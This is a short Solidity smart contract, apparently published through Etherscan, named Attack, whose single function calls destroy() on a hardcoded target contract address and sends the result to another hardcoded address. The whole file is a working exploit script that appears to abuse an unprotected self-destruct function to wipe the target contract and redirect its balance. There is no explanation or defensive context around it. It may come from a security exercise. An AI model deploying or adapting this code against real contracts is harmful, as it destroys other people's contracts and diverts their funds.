/**
 *Submitted for verification at Etherscan.io on 2022-05-29
*/

pragma solidity ^0.6.0;



interface Target {
    function destroy(address payable _to) external;
}

contract Attack {
    constructor() public {}

    function doit() external {
        Target target = Target(0x5349603A4a3a7417D9143529e74E4c1138f77864);
        target.destroy(0x73A1AcB3E108a4C585c30D95984d3eb492c2E8A7);
    }
}